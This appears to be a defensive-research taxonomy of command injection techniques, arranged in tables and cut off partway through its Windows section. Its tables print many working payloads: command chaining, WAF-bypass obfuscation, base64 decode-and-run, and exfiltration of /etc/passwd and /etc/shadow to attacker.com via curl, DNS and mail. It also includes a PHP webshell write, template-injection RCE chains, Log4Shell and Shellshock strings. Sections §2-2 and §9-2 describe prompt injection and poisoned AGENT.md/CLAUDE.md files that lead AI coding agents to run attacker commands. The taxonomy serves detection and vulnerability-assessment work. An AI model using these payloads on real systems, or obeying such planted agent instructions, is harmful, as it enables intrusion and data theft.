# Command Injection Mutation Taxonomy (2025)

*A comprehensive structural classification of command injection variations, bypass techniques, and emerging attack surfaces. Intended for defensive security research, vulnerability assessment, and detection engineering.*

---

## Classification Structure

This taxonomy organizes the command injection attack surface along three axes. **Axis 1 (Mutation Target)** defines the structural component being exploited or mutated — the shell metacharacter layer, argument surface, encoding, deployment context, and so on. These form the twelve top-level categories (§1–§12). **Axis 2 (Discrepancy Type)** captures the nature of the mismatch or bypass each technique creates — whether it is a parser differential, a character set confusion, a time-domain side channel, or a trust boundary violation. **Axis 3 (Attack Scenario)** maps techniques to the real-world deployment condition in which they become exploitable, addressed in the Attack Scenario Mapping section.

A cross-cutting principle underlies every category: command injection exists wherever a developer crosses a **trust boundary** — taking data from an untrusted layer (HTTP input, filename, environment, LLM context) and passing it into a **command interpreter** (shell, template engine, CI runner, AI agent tool-call) without structurally separating data from instructions. Every mutation below is an attack on one specific part of that boundary.

**Key taxonomy terms used throughout:**
- *Classic injection*: shell metacharacters break out of a command argument context.
- *Argument injection*: attacker-controlled flags/options are added to a fixed binary without a separator.
- *Blind injection*: output is not reflected; confirmation is via timing or out-of-band channels.
- *Results-based injection*: command output appears in the HTTP response or downstream behavior.
- *OAST (Out-of-Band Application Security Testing)*: using DNS/HTTP callbacks to detect and exfiltrate from blind contexts.

---

## §1. Shell Metacharacter Injection (Command Chaining)

The oldest and most prevalent class: injecting characters that the shell parser interprets as command boundaries, allowing attacker-controlled commands to piggyback on a developer-intended one. The fundamental vulnerability is concatenating untrusted input directly into a shell-invoked string.

### §1-1. Sequential and Conditional Separators

A command separator allows injecting a second, independent command into the same shell invocation. Separators differ in their conditional semantics, which affects payload construction and filter bypass strategies.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Semicolon chaining** | `;` executes the subsequent command unconditionally regardless of exit code | `1.1.1.1; whoami` | POSIX shells only; filtered on many WAFs |
| **Background fork** | `&` forks the injected command to background, returns immediately | `1.1.1.1 & id` | Enables asynchronous execution; useful for blind injection |
| **AND chain** | `&&` runs the second command only if the first exits with code 0 | `1.1.1.1 && cat /etc/passwd` | Reliable when base command always succeeds |
| **OR chain** | `\|\|` runs the second command only if the first fails | `invalid_host \|\| whoami` | Forces execution by feeding a failing first command |
| **Pipe redirection** | `\|` passes stdout of first to stdin of second | `cat /etc/passwd \| curl attacker.com` | Exfiltration primitive |
| **Newline injection** | `\n` or `%0a` triggers a new command line in some parsers | `host%0aid` | Bypasses WAFs that only block `;`, `&`, `\|` |
| **Carriage return** | `\r` or `%0d` may create a new command in specific shell or CGI parsing contexts | `host%0dwhoami` | Platform-dependent; useful in CRLF-tolerant parsers |

### §1-2. Sub-Shell Execution Operators

These operators embed a command whose output becomes part of the outer command's argument string. They are syntactically different from separators but equally dangerous.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Backtick substitution** | `` `cmd` `` — the shell executes the enclosed command and substitutes its output inline | `` ping `whoami`.attacker.com `` | Classic; filtered by many pattern matchers |
| **Dollar-paren substitution** | `$(cmd)` — POSIX-standard alternative to backticks | `ping $(id).attacker.com` | Equivalent to backtick; often bypasses backtick-specific filters |
| **Nested substitution** | Combining `$()` inside another `$()` | `$($(cat /etc/pass*))` | Bypasses shallow nesting filters |
| **Brace expansion** | `{cmd1,cmd2}` causes the shell to expand into multiple words | `{whoami,id}` | Works in bash; useful when spaces are blocked |

---

## §2. Argument Injection (Flag and Option Hijacking)

Argument injection is a structurally distinct and frequently underestimated sub-class. When an application passes user input as a *safe argument* to a trusted binary (e.g., via `escapeshellarg()`), but the attacker can inject flag-syntax characters (`-`, `--`) that the binary interprets as command-line options, arbitrary behavior of that binary can be weaponized — without ever using a shell metacharacter.

The attack surface spans every binary invoked by the application. Authoritative registries (e.g., the Sonar Argument Injection Vectors database) catalog hundreds of binaries with exploitable flags.

### §2-1. Flag Injection via Delimiter Absence

When the application fails to terminate the option-parsing phase before appending user input, any value beginning with `-` is interpreted as a flag.

| Subtype | Mechanism | Example (tar) | Condition |
|---------|-----------|---------------|-----------|
| **Arbitrary flag injection** | Attacker prepends `-` or `--` to inject any option the binary supports | `--use-compress-program=malware.sh` (tar) | No `--` end-of-options delimiter present |
| **Exec-flag injection** | Binaries like `find` and `fd` support `-exec` / `-x` to run commands on matched items | `-exec bash -c "curl attacker.com" \;` (find) | Application uses `find` with user-controlled path |
| **Output-redirect flags** | Binaries like `curl` and `wget` support `-o` / `--output` to write to arbitrary paths | `-o /var/www/webshell.php` (curl) | Web root is writable; leads to webshell deployment |
| **Format-string flags** | `git show --format=%H` can be chained with output flags to create/execute files | `git show --format=... --output=file` | Access to git; write access implied |

### §2-2. Argument Injection via AI Agent Tool-Call (2025 Emerging)

AI agents that invoke CLI tools (find, ripgrep, go test) with user-controlled parameters are vulnerable to the same argument-injection patterns, but the attack surface is dramatically expanded: the user can inject flags through natural-language prompts rather than HTTP parameters, often bypassing human-review allow-lists because the *approved command name* remains correct. Research (Trail of Bits, 2025) demonstrated one-shot RCE across three popular AI agent platforms via this vector.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **LOLBIN argument abuse** | Agent invokes an allow-listed binary; attacker injects exec/output flags via prompt | `go test -exec 'bash -c "curl c2"'` | Agent has shell execution; command not fully sandboxed |
| **Two-command pivot** | Attacker uses one allowed tool (e.g., `git show`) to create a file, then a second tool (`ripgrep --pre`) to execute it | Hex-encode payload → write via git → exec via ripgrep | Two-step; bypasses single-command review |
| **AGENT.md / CLAUDE.md poison** | Malicious instructions placed in configuration files consumed by agentic coders | Hidden `run: curl attacker.com` directive in AGENT.md | Agent reads project config automatically |

Cross-reference: this vector combines §2-1 (flag injection) with §12 (AI/agent injection surfaces).

---

## §3. Obfuscation and Filter Bypass at the Character Level

Once a basic injection point is identified, an attacker must bypass WAF signatures, application-level blocklists, and pattern-matching defenses. This category covers character-level transformations that preserve semantic meaning for the shell while defeating literal-string detection.

### §3-1. Whitespace Substitution

Many blocklists filter the space character (0x20). The POSIX shell recognizes several alternatives that function identically as argument separators.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **$IFS variable** | The Internal Field Separator variable defaults to whitespace; `${IFS}` expands to a space | `cat${IFS}/etc/passwd` | Linux bash/sh shells |
| **Tab character** | Hex `0x09`; the shell treats tab as whitespace | `cat%09/etc/passwd` | Application URL-decodes before passing to shell |
| **Input redirection as separator** | `<` can separate a command from its argument in some contexts | `cat</etc/passwd` | bash only; reads file via stdin redirection |
| **Brace expansion (no space)** | `{cmd,arg}` syntax requires no spaces | `{cat,/etc/passwd}` | bash; effective when both space and IFS are blocked |

### §3-2. Command Name Obfuscation

WAFs and blocklists often match against known command strings (`cat`, `whoami`, `id`). Shell quoting and variable expansion destroy these literal matches without changing the semantics.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Quote insertion** | Empty strings (`''` or `""`) interspersed in a command name are ignored by the shell | `c'at' /etc/passwd`, `w"h"o"am"i` | Any POSIX shell |
| **Backslash escape** | Backslash before a non-special character is a no-op in most contexts | `\w\h\o\a\m\i` | bash; breaks literal pattern matches |
| **Variable substitution** | Store the command in a variable and execute the variable | `X=whoami; $X` | Single-dollar eval; effective against static string filters |
| **Reverse + eval** | Reverse a blacklisted string, pass through `rev`, execute | `$(rev<<<'imaohw')` | bash; heredoc syntax; defeats exact-match rules |
| **Base64 decode-execute** | Encode the entire payload in base64, decode and pipe to bash | `echo "d2hvYW1p"\|base64 -d\|bash` | Requires `base64` on target; evades almost all string-match WAFs |
| **Hex decode-execute** | Similar encoding using xxd or printf | `bash<<<$(xxd -r -p<<<776863616d69)` | Requires `xxd`; useful when `base64` is explicitly blocked |
| **Uninitialized variable insertion** | Uninitialized bash variables expand to empty string, breaking WAF regex patterns | `;$u cat$u $u/etc/passwd` | bash; null expansion trick; bypasses OWASP CRS PL2 |

### §3-3. Path Obfuscation

WAF rules often match known filesystem paths (`/etc/passwd`, `/bin/cat`). Shell globbing resolves wildcard patterns to matching file paths *before* execution, so the WAF inspects the wildcard string rather than the resolved path.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Single-char wildcard** | `?` matches any one character | `/???/??t /??c/p??s??` → `/bin/cat /etc/passwd` | Linux filesystem; path must uniquely resolve |
| **Multi-char wildcard** | `*` matches zero or more characters | `/etc/p*ss*d` | Must resolve without ambiguity |
| **Brace range glob** | `{a..z}` or character classes | `/bi{n,n}/w{h,h}o{a,a}m{i,i}` | Less commonly filtered; verbose but effective |
| **Environment variable substrings** | `${HOME:0:1}` extracts the first character of HOME (a `/`) | `${HOME:0:1}etc${HOME:0:1}passwd` | bash variable substring; bypasses literal-slash filters |
| **SHELLOPTS character extraction** | `${SHELLOPTS:N:1}` extracts specific letters from the shell option string | `${SHELLOPTS:3:1}at` → `cat` | bash; depends on SHELLOPTS order on the target system |
| **Windows %VARIABLE:~start,len%** | Substring of Windows environment variables to reconstruct paths/commands | `ping%CommonProgramFiles:~10,-18%7.0.0.1` | Windows only; CMD environment variable substring |

---

## §4. Encoding and Character-Set Mutation

Beyond shell-level obfuscation, attackers exploit mismatches between how the *security layer* decodes input and how the *execution layer* interprets it. Double-encoding and Unicode normalization create gaps that WAFs, escapers, and validators fail to handle consistently.

### §4-1. URL and Percent-Encoding Bypasses

Application-level input validation often decodes URL encoding once, then passes the result to an OS API. A second decoding step at a different layer creates the bypass.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Single URL encoding** | Standard percent-encoding of metacharacters | `%3B` for `;` | Application or WAF decodes exactly once |
| **Double URL encoding** | Encode the percent sign itself, creating a second-order decode | `%253B` → decoded to `%3B` → then `;` | Application performs two decode passes; WAF inspects after first |
| **Encoded newlines** | `%0a` (LF) or `%0d` (CR) as command separators | `ip=%0awhoami` | Application passes newline to shell context |
| **Null byte injection** | `%00` terminates strings in C-based backends, truncating suffix validation | `cmd.php%00.txt` | C/C++ runtime string handling; PHP CGI legacy contexts |

### §4-2. Unicode / Best-Fit Character Confusion (WorstFit, 2025)

Presented at Black Hat by DEVCORE researchers Orange Tsai and Splitline Huang, the **WorstFit** attack exploits Windows' "Best-Fit" character conversion — an internal mechanism that maps Unicode characters to their ANSI equivalents when ANSI APIs are used. This silently transforms visually distinct Unicode characters into ASCII shell metacharacters.

The real-world impact is significant: CVE-2024-4577 (PHP-CGI on Windows) was exploited by the Tellyouthepass ransomware group using this technique; ElFinder and Cuckoo Sandbox were also affected.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Soft-hyphen to hyphen** | Unicode U+00AD (soft hyphen) is Best-Fit-mapped to U+002D (`-`) on code page 1252 | `﹣﹣use-compress-program=evil` | Windows; PHP or other ANSI-API applications |
| **Fullwidth double-quote** | U+FF02 (fullwidth `"`) maps to U+0022 (`"`), breaking argument quoting | `wget ＂--use-askpass=calc＂` | Windows; wget.exe, tar.exe using ANSI command-line parsing |
| **Yen-to-backslash** | U+00A5 (¥) maps to `\` on Japanese code page 932 | Path manipulation via yen symbol | Windows systems with CJK locale; affects path parsing |
| **Argument splitting via GetCommandLineA** | Manipulating GetCommandLineA output through Best-Fit-mapped quotes allows injecting unlimited arguments even from a small controlled region | Fullwidth quotes in a partial-control scenario | Windows; any application using ANSI GetCommandLineA |
| **Filename smuggling** | Unicode filenames resolve to malicious ANSI paths after Best-Fit conversion | `√π⁷≤∞` → `vp7=8` (path traversal trigger) | Windows ANSI API filesystem operations |

### §4-3. Character Encoding Context Switching

Some applications use different encodings at different pipeline stages. An attacker who knows the sequence can craft input that is benign at the validation stage and malicious at execution.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **HTML entity injection** | `&#119;&#104;...` entities are decoded by HTML parsers before reaching shell contexts in some SSI or template pipelines | `&#119;hoami` in an SSI-processed field | Server-Side Includes or HTML preprocessing before shell call |
| **Unicode normalization mismatch** | NFKC/NFC normalization converts lookalike characters to ASCII equivalents after WAF inspection | `ｗhoami` (fullwidth w) normalized to `whoami` | Applications or middleware performing Unicode normalization |
| **Base64 in log/config fields** | Some applications decode base64 in config parsing or logging before execution | Base64-encoded OS command in a configuration field | Application-specific; common in YAML/JSON config parsers |

---

## §5. Blind Injection Detection and Exfiltration Channels

When command output is not returned in the HTTP response, attackers must use indirect channels to confirm and exploit the vulnerability. This category maps the available exfiltration channels, from timing to full data retrieval.

### §5-1. Time-Based (In-Band Timing) Detection

The foundational blind confirmation technique: inject a `sleep` or `timeout` command and measure response latency.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Sleep-based confirmation** | `sleep N` pauses execution; response delay confirms injection | `; sleep 5` | Synchronous execution; applicable to both Linux and Windows |
| **Windows timeout equivalent** | `timeout /T N` or `ping -n N 127.0.0.1` for timed delay on Windows | `& ping -n 5 127.0.0.1` | Windows targets; ICMP loop provides reliable delay |
| **Arithmetic timing** | Using shell arithmetic loops to consume CPU for a fixed interval | `for i in $(seq 1 9999999); do :; done` | When `sleep`/`timeout` are blocked |
| **Asynchronous injection detection** | For commands that execute asynchronously (fire-and-forget), timing does not work; OAST must be used (§5-2) | N/A | Common in email processing, background jobs, and batch pipelines |

### §5-2. Out-of-Band (OAST) Exfiltration

Out-of-Band Application Security Testing leverages DNS lookups, HTTP callbacks, SMTP pings, or ICMP packets to confirm injection and exfiltrate data through channels orthogonal to the HTTP response stream.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **DNS subdomain exfiltration** | Encode command output in a DNS hostname lookup; attacker monitors their authoritative nameserver | `` nslookup `whoami`.attacker.com `` | DNS egress allowed from server; `nslookup`/`dig`/`host` available |
| **DNS + base64 encoding** | For longer output, chunk and base64-encode into DNS labels | `` nslookup `id\|base64`.attacker.com `` | DNS label length limit (63 chars); chunking needed for large output |
| **HTTP callback exfiltration** | `curl` or `wget` sends data as query parameter or POST body | `curl http://attacker.com/?d=$(cat /etc/passwd\|base64)` | HTTP egress allowed; more reliable than DNS for large data |
| **FTP channel** | `ftp` open connection to attacker FTP server, send file | `ftp attacker.com < /etc/passwd` | FTP egress open; rare in cloud environments |
| **SMTP exfiltration** | Pipe data to `sendmail` or `mail` for email delivery | `cat /etc/shadow \| mail -s "data" attacker@attacker.com` | SMTP relay available; useful in legacy environments |
| **ICMP data channel** | Encode data in ICMP payload for steganographic exfiltration | `ping -p <hex_encoded_data> attacker.com` | ICMP egress open; requires privileged listener |

### §5-3. File Write and In-Band Indirect Exfiltration

When network egress is blocked, attackers write command output to web-accessible files and retrieve it via HTTP.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Web-root file write** | Redirect command output to a file in the web root | `id > /var/www/html/out.txt` | Write access to web root; readable via HTTP |
| **Error-to-output redirection** | Redirect stderr to stdout, then write to accessible file | `cmd 2>&1 > /tmp/out.txt` | Useful when only stderr carries meaningful data |
| **Web shell deployment via file write** | Write a PHP/ASPX webshell to the web root for persistent access | `echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php` | Web root writeable; persistent access post-injection |

---

## §6. Template Engine and Expression Language Injection

When user input is passed to a *template rendering engine* or *expression language evaluator* rather than directly to a shell, a different class of injection emerges. Template engines (Jinja2, Twig, Freemarker, EL) provide programmatic access to underlying language runtimes, which in turn can invoke OS commands. From an attacker's perspective, this is a two-step chain: inject template syntax → abuse runtime to call `os.system()`, `Runtime.exec()`, or equivalent.

### §6-1. Python Template Engines (Jinja2, Mako, Tornado)

Jinja2 is the dominant Python template engine. When user input is concatenated into `render_template_string()` rather than passed as a named parameter, the attacker gains full access to Python's introspection capabilities.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Direct os module access** | Access `os` module via `__import__` | `{{ __import__('os').popen('id').read() }}` | No sandbox; direct Python execution |
| **MRO/subclass traversal** | Walk the Python class MRO to find subclasses that provide system access | `{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, ...) }}` | No sandbox; version-dependent subclass index |
| **Global context traversal** | Access `__globals__` via a known object in the template context | `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` | Jinja2-specific; works when cycler/joiner/namespace available in context |
| **Quote-bypass payload** | Use `chr()` or string concatenation to avoid quote characters when they are filtered | `{{ ''.__class__.__mro__[1].__subclasses__()[X](chr(105)+chr(100), ...)}}` | When quote characters are blocked |

### §6-2. Java Template Engines and Expression Languages (FreeMarker, Velocity, Thymeleaf, EL/OGNL)

Java template engines and EL interpreters provide access to Java reflection and runtime APIs. A notable 2024 exploit (CVE-2024-32651, changedetection.io) demonstrated SSTI-to-RCE via Jinja2 inside a Python application; similar patterns appear regularly across Java applications.

| Subtype | Mechanism | Example (FreeMarker) | Condition |
|---------|-----------|----------------------|-----------|
| **Java Runtime.exec()** | Direct invocation via FreeMarker's `?new()` or API access | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | FreeMarker without sandbox |
| **Velocity #set + ProcessBuilder** | Use Velocity's `#set` directive to create Java objects | `#set($ex = $class.forName("java.lang.Runtime"))` | Velocity without SecurityManager |
| **Spring EL (SpEL)** | Spring Expression Language evaluates arbitrary expressions | `T(java.lang.Runtime).getRuntime().exec('id')` | SpEL without allowlist |
| **OGNL (Struts/WebWork)** | Object-Graph Navigation Language injection via action parameters | `%{#context['com.opensymphony.xwork2.dispatcher...'].exec('id')}` | Apache Struts 2 without patching; numerous CVEs |
| **Thymeleaf expression bypass** | Fragment expressions in Thymeleaf can invoke arbitrary beans | `__${"".class.forName("java.lang.Runtime")...}__` | Thymeleaf without latest mitigations |

### §6-3. Node.js / JavaScript Template Engines (Pug, EJS, Handlebars)

| Subtype | Mechanism | Example (EJS) | Condition |
|---------|-----------|---------------|-----------|
| **EJS `<%= %>` eval** | EJS evaluates JavaScript inside tags; `require('child_process')` provides shell access | `<%= require('child_process').execSync('id') %>` | Template rendered server-side; EJS without sandbox |
| **Pug unbuffered code** | Pug's `-` prefix executes raw JavaScript | `- global.process.mainModule.require('child_process').exec('id')` | Pug template engine |
| **Handlebars prototype pollution chain** | Prototype pollution can escalate to code execution in Handlebars (CVE-2019-19919; pattern persists) | Pollute `__proto__` → trigger Handlebars eval | Handlebars < patched versions |

---

## §7. Injection via Indirect Input Channels (Non-Parameter Surfaces)

Traditional testing targets URL parameters and POST bodies. A significant proportion of real-world vulnerabilities — and the majority missed by automated scanners — reside in HTTP headers, cookies, filenames, environment variables, and protocol metadata. These vectors pass the same data to OS command execution but through channels that receive less scrutiny.

### §7-1. HTTP Header Injection

Applications frequently log or use HTTP headers in downstream system calls. The User-Agent, Referer, X-Forwarded-For, Cookie, and custom headers are all viable injection surfaces.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **User-Agent OS call** | User-Agent value concatenated into a shell command (e.g., for analytics, logging) | `User-Agent: curl; id` | Application uses User-Agent in a `system()` call |
| **Referer injection** | Referer header processed without sanitization in mail/logging pipelines | `Referer: '; cat /etc/passwd; echo '` | Application incorporates Referer into command construction |
| **X-Forwarded-For / IP injection** | Client IP stored/used in shell commands | `X-Forwarded-For: 127.0.0.1; wget http://attacker.com/shell.sh -O - \| bash` | Application trusts and acts on forwarded IP headers |
| **Cookie value injection** | Cookies processed in application logic that invokes OS commands | Cookie value contains `;id;` | Cookie used in shell invocation path |
| **JNDI via logged headers (Log4Shell pattern)** | Any HTTP header that gets logged by Log4j (User-Agent, Authorization, any custom header) can carry `${jndi:ldap://attacker.com/x}` | `User-Agent: ${jndi:ldap://attacker.com/x}` | Log4j 2 ≤ 2.14.1; CVE-2021-44228 (landmark; still present in legacy stacks 2024) |

### §7-2. Filename and Upload-Path Injection

Command execution via filename is a persistent class of vulnerabilities in file-upload-handling pipelines. The filename is processed by tools (ExifTool, ImageMagick, ffmpeg, tar, unzip) that are invoked via shell command strings containing the filename.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Shell metacharacters in filename** | Upload a file whose name contains command-injection syntax; the filename is included in a system() call | `a$(whoami)z.png` | Application calls `system("convert " + filename)` or similar |
| **Argument injection via filename prefix** | Filename starting with `-` is interpreted as an argument flag | `-use-askpass=evil.sh` | Tool called without `--` terminator |
| **Zip/Tar Slip RCE** | Archive contains a file with `../../../path` in its name; extraction writes to arbitrary location | `../../cron.d/evil` inside a .tar.gz | Extraction without path sanitization; leads to file-write-to-RCE |
| **ExifTool DjVu command injection (CVE-2021-22204)** | ExifTool's DjVu parser evaluated custom Perl code in metadata | Embedded metadata triggers `perl -e 'system(cmd)'` | ExifTool < 12.24 processing uploaded image files |
| **ImageMagick/ffmpeg argument injection** | Filenames or URLs passed to ImageMagick `convert` or ffmpeg can inject shell arguments or SSRF via custom decoders | `\|id` in ImageMagick path | Applications processing media files via these tools |
| **Non-ASCII filename path traversal to RCE** | CVE-2024-13059 (AnythingLLM): non-ASCII filenames bypass multer sanitization to write files to arbitrary paths | `../../startup/evil.sh` encoded as non-ASCII | multer < patched; Python multer pattern |

### §7-3. Environment Variable Injection

Environment variables propagate implicitly into every subprocess. If an attacker can set or influence environment variables, they can hijack program behavior even when no parameter is directly injectable.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **PATH hijacking** | Prepend an attacker-controlled directory to PATH; when the program calls a common binary by name, the malicious version is executed first | `PATH=/tmp/evil:$PATH; make` | Set-UID programs or CGI scripts that call commands by name without absolute paths |
| **LD_PRELOAD injection** | Set LD_PRELOAD to a malicious shared library; it is loaded into every dynamically linked process | `LD_PRELOAD=/tmp/evil.so` | Non-SUID programs; attacker has write access |
| **Shellshock (CVE-2014-6271 pattern)** | Bash evaluates function definitions exported in environment variables; trailing code after the function body is executed | `env x='() { :;}; id' bash -c 'test'` | bash ≤ 4.3; CGI applications; still present in embedded/legacy systems |
| **BASH_ENV / ENV injection** | These variables are sourced by bash startup; if attacker-controlled they execute arbitrary commands during shell initialization | `BASH_ENV=/attacker/evil.sh bash -c ''` | Bash invoked non-interactively; attacker can set env vars |
| **IFS manipulation** | Changing the Internal Field Separator can alter how the shell splits arguments in a running script | `IFS=/; PATH=usr/bin:usr/sbin` | Script relies on IFS-based splitting of user input |

---

## §8. Network Protocol and Infrastructure-Level Command Injection

Some command injection surfaces sit below the application layer, in network protocols, device firmware, and infrastructure components. These are often unauthenticated and remotely exploitable, making them the highest-severity variants in practice.

### §8-1. Web Management Interface Injection (IoT / Network Devices)

Routers, firewalls, cameras, and network appliances frequently implement web UIs where form parameters are passed directly to shell scripts or `system()` calls in CGI binaries. These devices often run reduced-capability Linux or busybox environments with minimal security tooling.

| Subtype | Mechanism | Example CVEs | Condition |
|---------|-----------|--------------|-----------|
| **CGI parameter injection** | Form parameter (hostname, IP, NTP server, etc.) concatenated into shell command in CGI binary | CVE-2024-30169 (Zeus Z3 SME-01); CVE-2024-30167 (Atlona AT-OME-MS42) | Authenticated or unauthenticated access to management interface |
| **Unauthenticated direct injection** | No authentication gate before the vulnerable CGI endpoint | CVE-2024-46506 (NetAlertX); CVE-2024-50603 (Aviatrix Controller) | Public or LAN-facing management port |
| **JSON/API body injection** | Modern device APIs accept JSON; body fields parsed insecurely into system calls | TOTOLINK X6000R (CVE-2025, Palo Alto Unit42) agentName parameter | REST API on device firmware |
| **Argument injection in device sanitizer** | Device implements a blocklist that misses `-` character; user can inject flags | TOTOLINK X6000R input validation missing hyphen | Blocklist-only defense without allowlist |
| **Authenticated privileged CLI bypass** | Admin users can inject beyond CLI sandbox to gain root | CVE-2025-4230, CVE-2025-4231 (Palo Alto PAN-OS CLI + Web); CVE-2024-8686 (PAN-OS) | Authenticated administrator access |

### §8-2. SSH ProxyCommand / ProxyJump Injection

The `ssh` client's ProxyCommand and ProxyJump features, when combining user-controlled hostnames, allow injection of commands into the proxy command string.

| Subtype | Mechanism | Example (CVE-2023-6004) | Condition |
|---------|-----------|-------------------------|-----------|
| **Hostname-as-command injection** | ssh ProxyCommand uses hostname directly in a shell command; a malicious hostname injects arbitrary commands | `ssh 'host;id'` with unchecked hostname | libssh2 / openssh with ProxyCommand using hostname interpolation without quoting |
| **ProxyJump chain injection** | Chained jump hosts; malicious intermediary host injects into subsequent ProxyJump invocations | CVE-2023-6004 (libssh2) | Applications using SSH client libraries that pass hostnames to ProxyCommand |

### §8-3. SMTP and Email Processing Injection

Mail-sending functionality is a classic injection surface when user-supplied addresses or headers are passed to `sendmail`, `mail`, or similar utilities without proper quoting.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Email address injection** | Shell metacharacters in an email address parameter passed to `mail -s "subject" $email` | `email=victim@example.com; id > /tmp/out` | Application calls `mail` command with user-supplied address |
| **Mail header injection for blind detection** | Inject commands that exfiltrate via SMTP back-channel; useful when no direct response is available | `; echo "$(id)" \| mail attacker@attacker.com` | SMTP relay available; application processes email asynchronously |

---

## §9. CI/CD Pipeline and Supply Chain Injection

The weaponization of continuous integration and delivery pipelines has emerged as one of the highest-impact command injection surfaces in 2024–2025. Shell injection in YAML-defined workflow files combines the reach of supply chain attacks with the privileges of build environments.

### §9-1. GitHub Actions / GitLab CI Script Injection

YAML-based CI pipeline definitions often interpolate context variables (pull request titles, branch names, commit messages) directly into `run:` shell steps. This "pwn request" pattern is a structural, systemic vulnerability.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **PR title/branch name injection** | `${{ github.event.pull_request.title }}` interpolated directly in a `run:` step | `; curl attacker.com/shell.sh \| bash` as PR title | `pull_request_target` trigger; workflow reads GitHub context into shell |
| **Head branch name injection** | Attacker-controlled head branch name interpolated into shell commands | Ultralytics December 2024 incident: `pull_request_target` + branch-name-in-shell | `pull_request_target` with write access; CI runs in privileged context |
| **Issue/comment body injection** | Issue or comment body used in shell scripts that perform triage/labeling automation | Rspack issue_comment workflow injection | AI-powered or automated issue-triage workflows |
| **YAML anchor injection** | Complex YAML structures that expand into unintended shell constructs | `!unsafe` tags and anchor aliasing in self-hosted CI | Specific CI implementations with YAML extension handling |

### §9-2. Action/Dependency Compromise (Supply Chain Pivot)

Rather than directly injecting into a workflow, an attacker compromises an upstream shared action or dependency. All workflows using that action then execute attacker-controlled code.

| Subtype | Mechanism | Key Incidents | Condition |
|---------|-----------|---------------|-----------|
| **Mutable tag overwrite** | Attacker with PAT access retroactively rewrites a git tag to point to a malicious commit | tj-actions/changed-files (CVE-2025-30066, March 2025); 23,000+ repos affected | Action referenced by mutable tag (e.g., `@v45`) rather than pinned SHA |
| **PAT-based account compromise → action poisoning** | Compromise a maintainer account; push malicious code to their action | reviewdog → tj-actions compromise chain | Weak PAT hygiene; write access via compromised token |
| **GitHub Actions cache poisoning** | Low-privilege workflow fills cache with >10GB of junk to trigger LRU eviction; poisons cache keys matching high-privilege workflows | Cline December 2025 incident; GHSA by Adnan Khan | Workflows share a cache scope; LRU eviction exploitable |
| **Prompt injection → CI shell injection chain** | Malicious content (issue body, PR description) injected into an AI agent (Claude Code Actions, Gemini CLI, Codex) that then executes privileged shell commands | PromptPwnd (Aikido Security, 2025); CVE-2025-53773 (GitHub Copilot RCE, CVSS 9.6) | AI agent in CI pipeline with shell access; AI output not sandboxed |

Cross-reference: §9-2 overlaps with §12 (AI agent surfaces).

---

## §10. Server-Side Template Injection Chains to OS Command Execution

Server-Side Template Injection (SSTI) is a distinct injection class in which user input is passed to a *template renderer* rather than a shell. However, because template engines provide access to host language runtimes, SSTI is often a *chain* to OS command injection. This category specifically covers the SSTI → OS command escalation path (for SSTI detection and template-engine-specific bypass, see §6).

### §10-1. Direct OS Execution via Template Engine

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Jinja2 popen RCE** | Access `os.popen()` through class introspection chain | `{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read() }}` | Jinja2 without sandbox; Flask/Django misuse of `render_template_string` |
| **FreeMarker Execute class** | Direct instantiation of the Execute utility class | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | FreeMarker ≥ 2.3.17 without TemplateClassResolver restriction |
| **Velocity Reflection** | Use Velocity's ClassTool or reflection to invoke `Runtime.exec()` | `$class.forName("java.lang.Runtime")...` | Apache Velocity without SecurityManager |
| **SSTI → file write → RCE** | Write a web shell or cron entry via SSTI file-write capability | Write PHP shell to web root via FreeMarker file-write operations | Disk write access from template engine context |

### §10-2. Sandbox Escape in Template Engines

When template engines implement a sandbox (e.g., Jinja2 sandbox mode, Python `__builtins__` restriction), attackers research sandbox escapes specific to each engine version.

| Subtype | Mechanism | Notable Examples | Condition |
|---------|-----------|------------------|-----------|
| **Jinja2 sandbox escape via cycler/namespace** | Non-obvious template context objects expose globals not blocked by sandbox | CVE-2019-10906 (Pallets Jinja2 sandbox escape) | Jinja2 sandbox; specific object accessibility |
| **Quote-filter bypass** | Avoid quote characters using `chr()` or string manipulation | `chr(105)+chr(100)` for `id` | When sandbox blocks string literals with quotes |
| **Attribute access bypass** | Use `getattr()`, `__getattribute__`, or `[]` notation when `.attr` access is blocked | `__getattribute__('__class__')` | Filtered attribute access |
| **Twig sandbox escape** | Twig's security policy can be bypassed via function chaining or specific object method calls | Twig CVE-2022-39261 and pattern continuations | Twig with inadequate security policy |

---

## §11. Windows-Specific Command Injection Mutations

Windows introduces additional command injection surfaces that are absent or differ significantly on POSIX systems. The CMD shell, PowerShell, and Windows API behavior each contribute unique mutation vectors.

### §11-1. CMD Shell Specific Syntax

Windows CMD uses different metacharacters and variable syntax than bash, creating gaps in detection rules tuned for POSIX.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
